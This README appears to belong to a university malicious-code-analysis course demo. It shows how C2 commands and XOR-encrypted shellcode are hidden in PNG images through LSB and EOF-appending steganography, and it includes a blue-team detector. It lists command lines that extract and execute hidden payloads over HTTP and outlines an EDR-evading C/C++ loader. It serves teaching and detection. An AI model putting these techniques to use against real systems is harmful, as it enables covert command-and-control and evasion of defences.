# Steganography-Based C2 Channel Demo

**CMU Heinz College — 95-759 Malicious Code Analysis**

A hands-on demonstration of two real-world steganography techniques used to hide C2 commands inside PNG images, plus blue-team detection tools.

---

## Two Techniques Compared

### Technique 1: LSB Steganography (`encoder.py` → `decoder.py`)
Hides data **inside pixel values** by modifying the least significant bit of each RGB channel. A 1-bit change per channel is invisible to the human eye.

**Real-world usage:** Turla, APT32/OceanLotus, Worok Group, Lumma Stealer, StegoLoader

### Technique 2: EOF Payload Appending (`payload_embedder.py` → `payload_extractor.py`)
Appends data **after the PNG IEND chunk** with optional XOR encryption. PNG readers stop at IEND, so the image renders normally while the hidden payload sits beyond it.

**Real-world usage:** hide-payload-in-images + Adaptix C2 campaigns, EDR-bypassing loaders
**Reference:** [WafflesExploits/hide-payload-in-images](https://github.com/andrecrafts/hide-payload-in-images)

---

## Quick Start

```bash
# Install dependencies
pip install -r requirements.txt

# Generate a test image (or drop your own PNG into images/)
python generate_test_image.py

# Run the full side-by-side demo
python demo_runner.py --command "whoami"
```

---

## Project Structure

```
stego-c2-demo/
│
├── encoder.py              # Technique 1: LSB encoder (attacker tool)
├── decoder.py              # Technique 1: LSB decoder/implant
├── server.py               # Flask C2 image server (shared)
├── compare.py              # Forensic comparison (original vs encoded)
│
├── payload_embedder.py     # Technique 2: EOF embedder (hide-payload-in-images style)
├── payload_extractor.py    # Technique 2: EOF extractor (simulates C/C++ loader)
│
├── stego_detector.py       # Blue team: detects both techniques
├── demo_runner.py          # Full automated demo (both techniques + detection)
├── generate_test_image.py  # Creates a test PNG image
├── requirements.txt        # Python dependencies
│
├── images/
│   ├── original.png        # Clean source image
│   ├── encoded.png         # LSB-encoded image
│   ├── embedded_eof.png    # EOF-embedded image
│   └── difference.png      # Amplified visual diff
│
├── reference/
│   └── c_loader_template.c # C/C++ loader reference (educational, not for use)
│
└── captures/
    └── demo.pcapng         # Wireshark capture (you record this)
```

---

## Individual Command Reference

### Technique 1: LSB Steganography

```bash
# Encode a command into an image
python encoder.py images/original.png "ipconfig" images/encoded.png

# Decode from local file
python decoder.py images/encoded.png

# Decode from HTTP (start server first)
python server.py &
python decoder.py http://localhost:8080/encoded.png

# Safe mode (extract but don't execute)
python decoder.py images/encoded.png --no-execute

# Compare original vs encoded
python compare.py images/original.png images/encoded.png
```

### Technique 2: EOF Appending (+ Adaptix C2 style)

```bash
# Embed a command (plaintext)
python payload_embedder.py images/original.png "whoami" images/embedded_eof.png

# Embed with XOR encryption
python payload_embedder.py images/original.png "net user /domain" images/embedded_eof.png --xor-key 0x4D

# Embed a binary file (e.g., shellcode)
python payload_embedder.py images/original.png payload.bin images/embedded_eof.png --file --xor-key 0xAA

# Extract (with decryption)
python payload_extractor.py images/embedded_eof.png --xor-key 0x4D

# Extract and execute
python payload_extractor.py images/embedded_eof.png --xor-key 0x4D --execute

# Extract from HTTP
python payload_extractor.py http://localhost:8080/embedded_eof.png --xor-key 0x4D --execute
```

### Blue Team Detection

```bash
# Scan any image for both techniques
python stego_detector.py images/original.png           # Clean
python stego_detector.py images/encoded.png            # LSB (hard to detect!)
python stego_detector.py images/embedded_eof.png -v    # EOF (detectable!)
```

---

## Detection Trade-offs (Key Demo Point)

| Detection Method     | Catches LSB? | Catches EOF? |
|---------------------|:---:|:---:|
| EOF analysis        | ✗ | **✓** |
| LSB statistics      | Difficult | ✗ |
| File hash comparison| **✓** (if baseline exists) | **✓** |
| `strings` command   | ✗ | ✗ (if XOR'd) |
| `file` command      | ✗ | ✗ |
| Wireshark inspection| ✗ | ✗ |

**Key insight:** Each technique evades the detection that catches the other. Comprehensive defense requires multiple analysis approaches.

---

## How the C/C++ Loader Works (Adaptix C2 Integration)

In a real attack, the extraction isn't done in Python — it's compiled into a C/C++ executable that:

1. **From disk:** Reads the image file, seeks past `ORIGINAL_FILE_SIZE`, reads the payload
2. **From .rsrc:** The image is embedded in the PE resources section — no file on disk
3. **From PEB:** Manually parses PE headers (no WinAPI calls) — evades EDR hooks

Then executes shellcode via `VirtualAlloc` + callback functions (`SetTimer`, `EnumFonts`, etc.)

See `reference/c_loader_template.c` for annotated code showing all three methods.

---

## Live Demo Sequence (15 min)

| Time | Action | Script |
|------|--------|--------|
| 0:00 | Slides: intro + LSB theory | — |
| 3:00 | Demo: encode + compare + forensics | `encoder.py`, `compare.py` |
| 6:00 | Demo: decode over HTTP + Wireshark | `server.py`, `decoder.py` |
| 8:00 | Slides: EOF technique + Adaptix C2 | — |
| 9:00 | Demo: EOF embed + extract + XOR | `payload_embedder.py`, `payload_extractor.py` |
| 11:00 | Demo: run detector on all images | `stego_detector.py` |
| 12:00 | Show comparison table | `demo_runner.py` output |
| 13:00 | Slides: detection/defense strategies | — |
| 14:00 | Q&A | — |

**Or run everything automated:** `python demo_runner.py --command "whoami"`
